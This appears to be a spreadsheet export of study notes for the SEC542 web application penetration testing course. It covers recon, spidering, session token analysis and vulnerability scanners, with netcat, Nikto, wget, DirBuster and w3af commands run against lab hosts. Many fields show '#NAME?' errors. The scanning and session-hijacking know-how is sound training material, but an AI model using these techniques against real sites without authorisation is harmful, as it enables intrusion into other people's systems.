TID,TSource,TTestName,TType,TDescription,TIssueName,TIssueType,TSeverity,TTesterSupport,TPhase,TSection,TStep,TIssueBackground,TRemediationBackground,TStdTest,TRef1,TRef2,TTRef,TCweID,TPCI,TTop10,TTop25
S542-2.2.45,SEC542,Software Configuration,,,,,,#NAME?,2. Recon & Mapping,2.2 Mapping,B2P113,,,,,,sec542/2.2/index.htm#s45,,,,
S542-2.2.46,SEC542,HTTP Request Methods Supported,,,,,,#NAME?,2. Recon & Mapping,2.2 Mapping,B2P114,,,,,,sec542/2.2/index.htm#s46,,,,
S542-2.2.41,SEC542,Load Balancing identification using HTML Source Differences,,,,,,#NAME?,2. Recon & Mapping,2.2 Mapping,B2P109,,,,,,sec542/2.2/index.htm#s41,,,,
S542-2.2.34,SEC542,Virtual Hosting,,,,,,#NAME?,2. Recon & Mapping,2.2 Mapping,B2P101,,,,,,sec542/2.2/index.htm#s34,,,,
S542-2.2.47,SEC542,Netcat to Determine Supported HTTP Methods,,,,,,"for method in GET POST PUT TRACE CONNECT OPTIONS;
do
  printf ""$method / HTTP/1.1\nHost: target.tgt\n\n""| nc target.tgt 80
done
Some methods may be turned on at different levels of the site",2. Recon & Mapping,2.2 Mapping,B2P115,,,,,,sec542/2.2/index.htm#s47,,,,
S542-2.2.50,SEC542,,,,,,,,2. Recon & Mapping,2.2 Mapping,,,,,,,sec542/2.2/index.htm#s50,,,,
S542-2.2.51,SEC542,Nikto Exercise: Goals,,,,,,-,2. Recon & Mapping,2.2 Mapping,B2P119,,,,,,sec542/2.2/index.htm#s51,,,,
S542-2.2.52,SEC542,Nikto Exercise: Scan Port 80,,,,,,"?/usr/bin/samurai/nikto$ ./nikto.pl -host www.sec542.org -Format HTM -out ~/nikto.html
---------------------------------------------------------------------------
+ Target IP:          192.168.1.41
+ Target Hostname:    www.sec542.org
+ Target Port:        80
+ Start Time:         2011-03-04 18:43:51
---------------------------------------------------------------------------
+ Server: Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4.1 with Suhosin-Patch mod_ssl/2.2.9 OpenSSL/0.9.8g
- /robots.txt - contains 2 'disallow' entries which should be manually viewed. (GET)
- Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ OSVDB-877: HTTP method ('Allow' Header): 'TRACE' is typically only used for debugging and should be disabled. This message does not mean it is vulnerable to XST.
+ OSVDB-0: ETag header found on server, inode: 114654, size: 51, mtime: 0x46bb0b19b3e40
+ PHP/5.2.6-2ubuntu4.1 appears to be outdated (current is at least 5.2.6RC4)
+ mod_ssl/2.2.9 appears to be outdated (current is at least 2.8.31) (may depend on server version)
+ mod_ssl/2.2.9 OpenSSL/0.9.8g - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell (difficult to exploit). http://cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2002-0082.
+ OSVDB-637: GET /~root/ : Allowed to browse root's home directory.
+ OSVDB-3233: GET /phpinfo.php : Contains PHP configuration information
+ OSVDB-48: GET /doc/ : The /doc/ directory is browsable. This may be /usr/doc.
+ OSVDB-877: TRACE / : TRACE option appears to allow XSS or credential theft. See http://www.cgisecurity.com/whitehat-mirror/WhitePaper_screen.pdf for details
+ OSVDB-3092: GET /backdoor/ : This might be interesting...
+ OSVDB-3092: GET /forum/ : This might be interesting...
+ OSVDB-3092: GET /test/ : This might be interesting...
+ OSVDB-3268: GET /icons/ : Directory indexing is enabled: /icons
+ OSVDB-3282: GET /uploader.php : This script may allow arbitrary files to be uploaded to the remote server.
+ OSVDB-3233: GET /icons/README : Apache default file found.
+ 3577 items checked: 17 item(s) reported on remote host
+ End Time:        2011-03-04 18:44:08 (17 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
",2. Recon & Mapping,2.2 Mapping,B2P120,,,,,,sec542/2.2/index.htm#s52,,,,
S542-2.2.48,SEC542,Default pages,,,Access to default web server content,,2,#NAME?,2. Recon & Mapping,2.2 Mapping,B2P116,"Weaknesses in this category are typically introduced during the configuration of the software, often due to poor harderning. Keeping default content from web servers increases the attack surface.",,,,,sec542/2.2/index.htm#s48,16,,,
S542-2.2.49,SEC542,Nikto,,,,,,"- www.cirt.net
- Check the MD5 hash of favicons to find-out what web server it is
- Lots of false positives (no content double-checks)
- Not hard to setup. One single file. Handles SSL.",2. Recon & Mapping,2.2 Mapping,B2P117,,,,,,sec542/2.2/index.htm#s49,,,,
S542-2.2.53,SEC542,Nikto Exercise: Analyzing Initial Scan,,,,,,"- Q1: What's intesting  in nikto's output? Supported methods, mod_ssl vuln, scripts, defaults
- Q2: What info can be discovered about the system? PHP/mod_ssl versions, new vulns
- Q3: Based on Nikto, what action items are for the client?
      Harden Apache (methods, access controls), update mod_ssl, remove unused scripts/files",2. Recon & Mapping,2.2 Mapping,B2P121,,,,,,sec542/2.2/index.htm#s53,,,,
S542-2.2.54,SEC542,Nikto Exercise: Q&A,,,,,,-,2. Recon & Mapping,2.2 Mapping,B2P122,,,,,,sec542/2.2/index.htm#s54,,,,
S542-2.2.55,SEC542,,,,,,,,2. Recon & Mapping,2.2 Mapping,,,,,,,sec542/2.2/index.htm#s55,,,,
S542-2.3.01,SEC542,Spidering: Section Objectives,,,,,,"Techniques that can be used to spider a site, robots and robot control, how to spider a site and tools that can be used to do it, commented code, disabled functionality, converting HTML into Text, identifying Linked Servers and sniffing while spidering and finding linked servers using (wireshark and TCPdump).",2. Recon & Mapping,2.3 Spidering,B2P124,,,,,,sec542/2.3/index.htm#s1,,,,
S542-2.3.04,SEC542,Spidering Methods,,,,,,#NAME?,2. Recon & Mapping,2.3 Spidering,B2P127,,,,,,sec542/2.3/index.htm#s4,,,,
S542-2.3.05,SEC542,WebScarab Spidering,,,,,,#NAME?,2. Recon & Mapping,2.3 Spidering,B2P128,,,,,,sec542/2.3/index.htm#s5,,,,
S542-2.3.06,SEC542,WebScarab Spider Configuration,,,,,,#NAME?,2. Recon & Mapping,2.3 Spidering,B2P129,,,,,,sec542/2.3/index.htm#s6,,,,
S542-2.3.07,SEC542,Paros Spidering,,,,,,#NAME?,2. Recon & Mapping,2.3 Spidering,B2P130,,,,,,sec542/2.3/index.htm#s7,,,,
S542-2.3.08,SEC542,Burp Spidering,,,,,,#NAME?,2. Recon & Mapping,2.3 Spidering,B2P131,,,,,,sec542/2.3/index.htm#s8,,,,
S542-2.3.09,SEC542,Wget Spidering,,,,,,#NAME?,2. Recon & Mapping,2.3 Spidering,B2P132,,,,,,sec542/2.3/index.htm#s9,,,,
S542-2.3.10,SEC542,Specialized Spidering Tools,,,,,,#NAME?,2. Recon & Mapping,2.3 Spidering,B2P133,,,,,,sec542/2.3/index.htm#s10,,,,
S542-2.3.11,SEC542,,,,,,,,2. Recon & Mapping,2.3 Spidering,,,,,,,sec542/2.3/index.htm#s11,,,,
S542-2.3.12,SEC542,,,,,,,,2. Recon & Mapping,2.3 Spidering,,,,,,,sec542/2.3/index.htm#s12,,,,
S542-2.3.13,SEC542,Spidering Exercise: Wget,,,,,,"- wget -r http://www.sec542.org
- Q1: Why are there discrepancies between the orig site and the wget download?
   A1: wget doesn't handle dynamically generated links (javascript), no creds were provided, no bruteforcing...
- Q2 - Q4 (answers at pg 143)
",2. Recon & Mapping,2.3 Spidering,B2P136,,,,,,sec542/2.3/index.htm#s13,,,,
S542-2.3.14,SEC542,Spidering Exercise: WebScarab,,,,,,,2. Recon & Mapping,2.3 Spidering,B2P137,,,,,,sec542/2.3/index.htm#s14,,,,
S542-2.3.15,SEC542,,,,,,,,2. Recon & Mapping,2.3 Spidering,,,,,,,sec542/2.3/index.htm#s15,,,,
S542-2.3.03,SEC542,Robot Control,,,,,,"- Well behaved robots will follow rules (targets of interest)
- In robots.txt 
  User-agent: *
  Disallow: /images/
- Meta tag to control search engines
  <META NAME=""ROBOTS""CONTENT=""INDEX,NOFOLLOW"">
  <META NAME=""GOOGLEBOT"" CONTENT=""NOARCHIVE"">
- Tags to prevent caching of content
   <META HTTP-EQUIV=""PRAGMA"" CONTENT=""NO-CACHE"">
   <META HTTP-EQUIV=""PRAGMA"" CONTENT=""NO-CACHE"">
- Don't use robot control as security mechanism!",2. Recon & Mapping,2.3 Spidering,B2P126,,,,,,sec542/2.3/index.htm#s3,,,,
S542-2.3.17,SEC542,,,,,,,,2. Recon & Mapping,2.3 Spidering,,,,,,,sec542/2.3/index.htm#s17,,,,
S542-2.3.18,SEC542,,,,,,,,2. Recon & Mapping,2.3 Spidering,,,,,,,sec542/2.3/index.htm#s18,,,,
S542-2.3.19,SEC542,Spidering Exercise: CeWL,,,,,,- ?/usr/bin/samurai/cewl$ ./cewl.rb http://www.sec542.org,2. Recon & Mapping,2.3 Spidering,B2P142,,,,,,sec542/2.3/index.htm#s19,,,,
S542-2.3.02,SEC542,Spidering the Target Site,,,,,,#NAME?,2. Recon & Mapping,2.3 Spidering,B2P125,,,,,,sec542/2.3/index.htm#s2,,,,
S542-2.3.16,SEC542,Spidering Exercise: Burp,,,,,,,2. Recon & Mapping,2.3 Spidering,B2P139,,,,,,sec542/2.3/index.htm#s16,,,,
S542-2.3.22,SEC542,Spidering Results Analysis,,,,,,#NAME?,2. Recon & Mapping,2.3 Spidering,B2P145,,,,,,sec542/2.3/index.htm#s22,,,,
S542-2.3.23,SEC542,HTML Comments,,,,,,"- Sometimes the username/passwords
- <?php //Don't forget to fix the auth bug ?>  (stays on server side)",2. Recon & Mapping,2.3 Spidering,B2P146,,,,,,sec542/2.3/index.htm#s23,,,,
S542-2.3.24,SEC542,Disabled Functionality,,,,,,-,2. Recon & Mapping,2.3 Spidering,B2P147,,,,,,sec542/2.3/index.htm#s24,,,,
S542-2.3.20,SEC542,Spidering Exercise: Q&A,,,,,,,2. Recon & Mapping,2.3 Spidering,B2P143,,,,,,sec542/2.3/index.htm#s20,,,,
S542-2.3.21,SEC542,,,,,,,,2. Recon & Mapping,2.3 Spidering,,,,,,,sec542/2.3/index.htm#s21,,,,
S542-2.3.25,SEC542,Types of Disabled Functionality,,,,,,"- Commented-out links, 
- Commented-out code (logic errors, hidden pages, outdated functionality)
- Dead-end functions",2. Recon & Mapping,2.3 Spidering,B2P148,,,,,,sec542/2.3/index.htm#s25,,,,
S542-2.3.26,SEC542,Convert HTML to Text,,,,,,#NAME?,2. Recon & Mapping,2.3 Spidering,B2P150,,,,,,sec542/2.3/index.htm#s26,,,,
S542-2.4.03,SEC542,App Flow Charting with Pen and Paper,,,,,,-,2. Recon & Mapping,2.4 App Flow Charting,B2P153,,,,,,sec542/2.4/index.htm#s3,,,,
S542-2.4.04,SEC542,App Flow Charting with Diagramming Software,,,,,,"- Visio 2003 has add-on to spider a web site
- Kivio (OpenSource, KDE) adn Omnigraffle (Mac OS X, The Omni Group)
- Dia (OpenSource)",2. Recon & Mapping,2.4 App Flow Charting,B2P154,,,,,,sec542/2.4/index.htm#s4,,,,
S542-2.4.05,SEC542,App Flow Charting with Spidering Software,,,,,,#NAME?,2. Recon & Mapping,2.4 App Flow Charting,B2P155,,,,,,sec542/2.4/index.htm#s5,,,,
S542-2.4.06,SEC542,,,,,,,,2. Recon & Mapping,2.4 App Flow Charting,,,,,,,sec542/2.4/index.htm#s6,,,,
S542-2.4.07,SEC542,Relationship Analysis,,,,,,#NAME?,2. Recon & Mapping,2.4 App Flow Charting,B2P157,,,,,,sec542/2.4/index.htm#s7,,,,
S542-2.4.08,SEC542,Relationship Analysis: Dividing the App into Sections,,,,,,#NAME?,2. Recon & Mapping,2.4 App Flow Charting,B2P158,,,,,,sec542/2.4/index.htm#s8,,,,
S542-2.4.09,SEC542,Relationship Analysis: Looking for Missed Pages,,,,,,#NAME?,2. Recon & Mapping,2.4 App Flow Charting,B2P159,,,,,,sec542/2.4/index.htm#s9,,,,
S542-2.4.10,SEC542,Identifying Code Styles,,,,,,"- Find weakness in code styles from diff. developers or diff. tools (notes features of DreamWeavers, .mno files, schema files)",2. Recon & Mapping,2.4 App Flow Charting,B2P160,,,,,,sec542/2.4/index.htm#s10,,,,
S542-2.4.11,SEC542,Different Developers Could Lead to Security Flaws,,,,,,"- Where developers write code
- Assumptions to be exploited (pre-authz, session token)
- Input filtering only to block XSS, Output encoding only",2. Recon & Mapping,2.4 App Flow Charting,B2P161,,,,,,sec542/2.4/index.htm#s11,,,,
S542-2.4.12,SEC542,Identifying Naming Systems: Used in a Web App,,,,,,#NAME?,2. Recon & Mapping,2.4 App Flow Charting,B2P162,,,,,,sec542/2.4/index.htm#s12,,,,
S542-2.4.13,SEC542,Finding Other Pages,,,,,,#NAME?,2. Recon & Mapping,2.4 App Flow Charting,B2P163,,,,,,sec542/2.4/index.htm#s13,,,,
S542-2.4.14,SEC542,OWASP DirBuster,,,,,,#NAME?,2. Recon & Mapping,2.4 App Flow Charting,B2P164,,,,,,sec542/2.4/index.htm#s14,,,,
S542-2.4.15,SEC542,,,,,,,,2. Recon & Mapping,2.4 App Flow Charting,,,,,,,sec542/2.4/index.htm#s15,,,,
S542-2.4.16,SEC542,,,,,,,,2. Recon & Mapping,2.4 App Flow Charting,,,,,,,sec542/2.4/index.htm#s16,,,,
S542-2.4.17,SEC542,,,,,,,,2. Recon & Mapping,2.4 App Flow Charting,,,,,,,sec542/2.4/index.htm#s17,,,,
S542-2.4.18,SEC542,DirBuster Exercise,,,,,,"-? /usr/bin/samurai/DirBuster-1.0-RC1$ java -jar DirBuster-1.0-RC1.jar
- Limit threads to 5-10. 
- ?Small list: /usr/bin/samurai/DirBuster-1.0-RC1/directory-list-lowercase-2.3-small.txt",2. Recon & Mapping,2.4 App Flow Charting,B2P168,,,,,,sec542/2.4/index.htm#s18,,,,
S542-2.4.19,SEC542,,,,,,,,2. Recon & Mapping,2.4 App Flow Charting,,,,,,,sec542/2.4/index.htm#s19,,,,
S542-2.4.20,SEC542,,,,,,,,2. Recon & Mapping,2.4 App Flow Charting,,,,,,,sec542/2.4/index.htm#s20,,,,
S542-2.4.01,SEC542,App. Flowcharting: Section Objectives,,,,,,"Techniques used to identify the logic flow of a web application, the basic methods for application flow charting, techniques for relationship analysis OWAS DirBuster, how to gather and analyze session tokens, and session token analysis with WebScarab.",2. Recon & Mapping,2.4 App Flow Charting,B2P151,,,,,,sec542/2.4/index.htm#s1,,,,
S542-2.4.02,SEC542,Application Flow Charting,,,,,,#NAME?,2. Recon & Mapping,2.4 App Flow Charting,B2P152,,,,,,sec542/2.4/index.htm#s2,,,,
S542-2.4.21,SEC542,Session Token Gathering,,,,,,"- To hijack other  people's session
- Predict previous sessions most of the time (active sessions)
- Manually, scripts or WebScarab",2. Recon & Mapping,2.4 Session Analysis,B2P171,,,,,,sec542/2.4/index.htm#s21,,,,
S542-2.4.22,SEC542,Session Token Variables,,,,,,"- 3 typical ways: URL, Hidden form field, Cookies (JSESSIONID)
- Sometimes multiple ways (URL + cookies, multiple cookies)
- ColdFusion: CFID (predictable) CFTOKEN added later optionally (harder to predict)",2. Recon & Mapping,2.4 Session Analysis,B2P172,,,,,,sec542/2.4/index.htm#s22,,,,
S542-2.4.23,SEC542,Identifying Session Tokens,,,,,,#NAME?,2. Recon & Mapping,2.4 Session Analysis,B2P173,,,true,,,sec542/2.4/index.htm#s23,,,,
S542-2.4.24,SEC542,Session Token Predictability,,,,,,#NAME?,2. Recon & Mapping,2.4 Session Analysis,B2P174,,,,,,sec542/2.4/index.htm#s24,,,,
S542-2.4.25,SEC542,Manually Collecting Session Credentials,,,,,,#NAME?,2. Recon & Mapping,2.4 Session Analysis,B2P175,,,,,,sec542/2.4/index.htm#s25,,,,
S542-2.4.26,SEC542,Collecting Session Credentials via Customized Scripts,,,,,,"- If WebScarab doesn't work, use python script (ses slide)",2. Recon & Mapping,2.4 Session Analysis,B2P176,,,,,,sec542/2.4/index.htm#s26,,,,
S542-2.4.29,SEC542,,,,,,,,2. Recon & Mapping,2.4 Session Analysis,,,,,,,sec542/2.4/index.htm#s29,,,,
S542-2.4.30,SEC542,Session Anal. Exercise: WebScarab,,,,,,#NAME?,2. Recon & Mapping,2.4 Session Analysis,B2P180,,,,,,sec542/2.4/index.htm#s30,,,,
S542-2.4.31,SEC542,,,,,,,,2. Recon & Mapping,2.4 Session Analysis,,,,,,,sec542/2.4/index.htm#s31,,,,
S542-2.4.27,SEC542,WebScarab Session Token Gathering and Analysis,,,,,,#NAME?,2. Recon & Mapping,2.4 Session Analysis,B2P177,,,,,,sec542/2.4/index.htm#s27,,,,
S542-2.4.33,SEC542,Session Anal. Exercise: Burp,,,,,,"- In Burp, right-click session initiation page  and ""send to sequencer""
- Select Sequencer tab, select URL and click Start Capture
- Click Analyze Now and view the report",2. Recon & Mapping,2.4 Session Analysis,B2P183,,,,,,sec542/2.4/index.htm#s33,,,,
S542-2.4.28,SEC542,Burp Sequencer Session Analysis,,,,,,"- Burp has a series of tests bullt-in (mathematical tests to verify entropy)
- FIPS 140-2 analysis
- Graphs and charts, explanations for the tests
- Can load file with session tokens",2. Recon & Mapping,2.4 Session Analysis,B2P178,,,,,,sec542/2.4/index.htm#s28,,,,
S542-2.4.32,SEC542,Session Anal. Exercise: Testing Jetty,,,,,,"- Start-up Jetty App Server in SEC542 VM
- Fetch 1000 session IDs with WebScarab using Webmin and Jetty
- In WebScarab, click SessionID Analysis tab and select from Preview Requests pull-down
- Click Test and in pop-up, check the session ID captured (if it appears OK)
- Set number of samples to 1000 and click on Fetch
- Switch to Analysis tab and select entry from Session Identifier pull-down
- Switch over to Visualizaition tab to see randomness chart",2. Recon & Mapping,2.4 Session Analysis,B2P182,,,,,,sec542/2.4/index.htm#s32,,,,
S542-3.1.02,SEC542,,,,,,,,3. Server-Side Disc.,3.1 Scanners,,,,,,,sec542/3.1/index.htm#s2,,,,
S542-3.1.01,SEC542,Application Discovery,,,,,,"Automated tools used to find web application vulnerabilities and their distinguisihing features, Grendel-Scan, w3af, the Burp Suite and the Samauri Suite.",3. Server-Side Disc.,3.1 Scanners,B3P01,,,,,,sec542/3.1/index.htm#s1,,,,
S542-3.1.05,SEC542,Vunerability Discovery,,,,,,"- First malicious traffic sent to web site
- Looking for potential weaknesses
- Find the path to exploitation
- Builds on work and discoveries of previous 2 steps",3. Server-Side Disc.,3.1 Scanners,B3P05,,,,,,sec542/3.1/index.htm#s5,,,,
S542-3.1.06,SEC542,Vuln Discovery Phase Elements,,,,,,#NAME?,3. Server-Side Disc.,3.1 Scanners,B3P06,,,,,,sec542/3.1/index.htm#s6,,,,
S542-3.1.07,SEC542,,,,,,,,3. Server-Side Disc.,3.1 Scanners,,,,,,,sec542/3.1/index.htm#s7,,,,
S542-3.1.03,SEC542,,,,,,,,3. Server-Side Disc.,3.1 Scanners,,,,,,,sec542/3.1/index.htm#s3,,,,
S542-3.1.04,SEC542,,,,,,,,3. Server-Side Disc.,3.1 Scanners,,,,,,,sec542/3.1/index.htm#s4,,,,
S542-3.1.08,SEC542,Web App Vulnerability Scanners,,,,,,#NAME?,3. Server-Side Disc.,3.1 Scanners,B3P08,,,,,,sec542/3.1/index.htm#s8,,,,
S542-3.1.11,SEC542,Grendel-Scan,,,,,,"- Cross-platform, in Java. http://grendel-scan.com
- Automated to help with manual tests
- Accept multiple URLs",3. Server-Side Disc.,3.1 Scanners,B3P11,,,,,,sec542/3.1/index.htm#s11,,,,
S542-3.1.12,SEC542,Glendel Mapping Mode,,,,,,"- 2 methods to build a map of an application
1. Spidering with base URLs, handling JavaScript pretty well
2. Single shot interception proxy. Manually walk through                                                                          app. Then later, the automated scan can be run from there.",3. Server-Side Disc.,3.1 Scanners,B3P12,,,,,,sec542/3.1/index.htm#s12,,,,
S542-3.1.09,SEC542,Choosing Plug-Ins,,,,,,"- Run the tool multiple times with one plugin at a time
1. Spider and Information Gathering Types
2. Spider, SQL Injection, File Include, OS Command Injection
3. Spider, XSS, XSRF
4. Spider and plug-ins based on the previous 3 scans",3. Server-Side Disc.,3.1 Scanners,B3P09,,,,,,sec542/3.1/index.htm#s9,,,,
S542-3.1.14,SEC542,,,,,,,,3. Server-Side Disc.,3.1 Scanners,,,,,,,sec542/3.1/index.htm#s14,,,,
S542-3.1.13,SEC542,Grendel Discovery Plug-ins,,,,,,"- Grendel is an assessment tool (no exploitation)
- Nessus-like but for web apps
- Plugins with * are experimental (higher rate of false-positives and false-negatives)",3. Server-Side Disc.,3.1 Scanners,B3P13,,,,,,sec542/3.1/index.htm#s13,,,,
S542-3.1.10,SEC542,,,,,,,,3. Server-Side Disc.,3.1 Scanners,,,,,,,sec542/3.1/index.htm#s10,,,,
S542-3.1.16,SEC542,Grendel Exercise: Configure the Spider,,,,,,"- /usr/bin/samurai/grendel-scan$ ./grendel.sh
- General Settings: 
  Base URLs: www.sec542.org, www.sec542.org/scanners
  Output Directory: /home/samurai/scanresults/grendel

",3. Server-Side Disc.,3.1 Scanners,B3P16,,,,,,sec542/3.1/index.htm#s16,,,,
S542-3.1.15,SEC542,,,,,,,,3. Server-Side Disc.,3.1 Scanners,,,,,,,sec542/3.1/index.htm#s15,,,,
S542-3.1.17,SEC542,Grendel Exercise: Select Plug-ins,,,,,,"- Test Module Selection: Select modules
   Keep defaults except: remove Website Mirror and add Comment Lister
- Scan->Start Scan",3. Server-Side Disc.,3.1 Scanners,B3P17,,,,,,sec542/3.1/index.htm#s17,,,,
S542-3.1.20,SEC542,,,,,,,,3. Server-Side Disc.,3.1 Scanners,,,,,,,sec542/3.1/index.htm#s20,,,,
S542-3.1.21,SEC542,Web Application Attack and Audit Framework (w3af),,,,,,#NAME?,3. Server-Side Disc.,3.1 Scanners,B3P21,,,,,,sec542/3.1/index.htm#s21,,,,
S542-3.1.22,SEC542,w3af GUI,,,,,,#NAME?,3. Server-Side Disc.,3.1 Scanners,B3P22,,,,,,sec542/3.1/index.htm#s22,,,,
S542-3.1.23,SEC542,w3af Console,,,,,,#NAME?,3. Server-Side Disc.,3.1 Scanners,B3P23,,,,,,sec542/3.1/index.htm#s23,,,,
S542-3.1.24,SEC542,w3af Scripting,,,,,,#NAME?,3. Server-Side Disc.,3.1 Scanners,B3P24,,,,,,sec542/3.1/index.htm#s24,,,,
S542-3.1.25,SEC542,w3af Discovery Plug-Ins,,,,,,"- Example plug-ins: reports on robots.txt, detect transparent proxy (using TRACE), google spider from Google cache
- Full list: ??fingerPKS, phpinfo, yahooSiteExplorer, wordpressfingerprint, pykto, allowedMethods, wsdlFinder, findCaptchas, dirbruter, frontpageversion, digitSum, halberd, importResults, faviconidentification, dnsWildcard, detectTransparentProxy, riaenumerator, fingerprintos, afd, spiderMan, dotNetErrors, sharedHosting, googleSpider, ghdb, webSpider, wordnet, serverHeader, slash, domaindot, fingerGoogle, fingerMSN, findBackdoor, zoneh, googleSets, sitemapReader, fingerprintWAF, urlFuzzer, detectReverseProxy, serverStatus, hmap, webDiff, oracleDiscovery, contentnegotiation, xssedDotCom, findvhost, phpEggs, robotsReader, archiveDotOrg, userDir, phishtank, xml, MSNSpider",3. Server-Side Disc.,3.1 Scanners,B3P25,,,,,,sec542/3.1/index.htm#s25,,,,
S542-3.1.19,SEC542,Grendel Exercise: View Results,,,,,,#NAME?,3. Server-Side Disc.,3.1 Scanners,B3P19,,,,,,sec542/3.1/index.htm#s19,,,,
S542-3.1.18,SEC542,Grendel Exercise: Use the Browser,,,,,,#NAME?,3. Server-Side Disc.,3.1 Scanners,B3P18,,,,,,sec542/3.1/index.htm#s18,,,,
S542-3.1.26,SEC542,w3af Evasion Plug-Ins,,,,,,"- Evades WAF, mod_security (built-in)
- hex encoding, ref dirs (./cgi-bin/./script.pl, case changes (case-insensitive sites)
 - Full list: ?fullWidthEncode, modsecurity, rndCase, reversedSlashes, selfReference, rndPath, rndHexEncode, backSpaceBetweenDots, rndParam, shiftOutShiftInBetweenDots",3. Server-Side Disc.,3.1 Scanners,B3P26,,,,,,sec542/3.1/index.htm#s26,,,,
S542-3.1.27,SEC542,w3af Audit Plugins,,,,,,"- Maps to our Discovery phase
- Tries to find XSS, SQL Injection, Response Splitting
- Build from Information Gathering
- Example audit plugins: sslCertificate (issues), unSSL, osCommanding (cmd injection)
- Full list: ?frontpage, eval, blindSqli, phishingVector, xss, xsrf, mxInjection, pregreplace, htaccessMethods, LDAPi, unSSL, sslCertificate, osCommanding, ssi, sqli, buffOverflow, redos, xpath, generic, localFileInclude, remoteFileInclude, responseSplitting, dav, formatString, globalRedirect, xst, fileUpload",3. Server-Side Disc.,3.1 Scanners,B3P27,,,,,,sec542/3.1/index.htm#s27,,,,
